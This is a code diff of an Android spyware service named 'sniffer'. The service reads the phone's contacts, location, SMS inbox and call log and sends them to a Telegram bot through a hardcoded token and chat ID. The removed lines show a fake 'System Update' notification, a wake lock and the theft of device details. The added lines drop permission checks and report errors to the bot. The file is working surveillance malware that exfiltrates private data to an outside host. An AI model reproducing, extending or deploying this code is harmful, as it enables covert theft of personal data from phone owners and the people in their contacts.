@@ -1,25 +1,14 @@
 package com.v8.global.sniffer;
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
-import android.os.Build;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.provider.ContactsContract;
-import android.provider.Settings;
-import android.telephony.TelephonyManager;
-
-import androidx.core.app.NotificationCompat;
-
-import org.json.JSONObject;
+import android.widget.Toast;
 
 import java.io.IOException;
 
@@ -33,69 +22,30 @@ public class DataService extends Service {
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private OkHttpClient client = new OkHttpClient();
-    private PowerManager.WakeLock wakeLock;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        Toast.makeText(this, "✅ بدء سحب البيانات", Toast.LENGTH_LONG).show();
         
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataService:WakeLock");
-        wakeLock.acquire();
-        
-        startForegroundService();
-        sendMessage("✅ DataService started");
-        
-        // سحب البيانات
         new Thread(() -> {
-            sendDeviceInfo();
+            sendMessage("✅ Service Started");
             getContacts();
             getLocation();
             getSms();
             getCallLog();
+            sendMessage("✅ All data collected");
         }).start();
-    }
-
-    private void startForegroundService() {
-        String channelId = "data_channel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Data Service", NotificationManager.IMPORTANCE_LOW);
-            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
-        }
-        Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update")
-                .setContentText("يعمل في الخلفية...")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build();
-        startForeground(1, notification);
-    }
-
-    private void sendDeviceInfo() {
-        try {
-            JSONObject info = new JSONObject();
-            info.put("model", Build.MODEL);
-            info.put("manufacturer", Build.MANUFACTURER);
-            info.put("android", Build.VERSION.RELEASE);
-            
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                info.put("phone", tm.getLine1Number());
-            }
-            
-            sendMessage("📱 Device: " + info.toString());
-        } catch (Exception e) {}
     }
 
     private void getContacts() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
-            
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
             StringBuilder sb = new StringBuilder("📇 Contacts:\n");
             int count = 0;
-            while (cursor != null && cursor.moveToNext() && count < 50) {
+            while (cursor != null && cursor.moveToNext() && count < 30) {
                 String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 sb.append(name).append(": ").append(number).append("\n");
@@ -103,28 +53,30 @@ public class DataService extends Service {
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendMessage("❌ Contacts error: " + e.getMessage());
+        }
     }
 
     private void getLocation() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
-            
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (location != null) {
                 sendMessage("📍 Location: " + location.getLatitude() + "," + location.getLongitude());
+            } else {
+                sendMessage("📍 Location: Not available");
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendMessage("❌ Location error: " + e.getMessage());
+        }
     }
 
     private void getSms() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
-            
             Cursor cursor = getContentResolver().query(
-                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
+                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
             StringBuilder sb = new StringBuilder("📨 SMS:\n");
             while (cursor != null && cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
@@ -133,26 +85,25 @@ public class DataService extends Service {
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendMessage("❌ SMS error: " + e.getMessage());
+        }
     }
 
     private void getCallLog() {
         try {
-            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
-            
             Cursor cursor = getContentResolver().query(
-                android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 20");
+                android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
             StringBuilder sb = new StringBuilder("📞 Calls:\n");
             while (cursor != null && cursor.moveToNext()) {
                 String number = cursor.getString(cursor.getColumnIndex("number"));
-                String type = cursor.getString(cursor.getColumnIndex("type"));
-                String duration = cursor.getString(cursor.getColumnIndex("duration"));
-                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
-                sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
+                sb.append(number).append("\n");
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendMessage("❌ Calls error: " + e.getMessage());
+        }
     }
 
     private void sendMessage(String text) {
@@ -170,10 +121,4 @@ public class DataService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-    }
 }
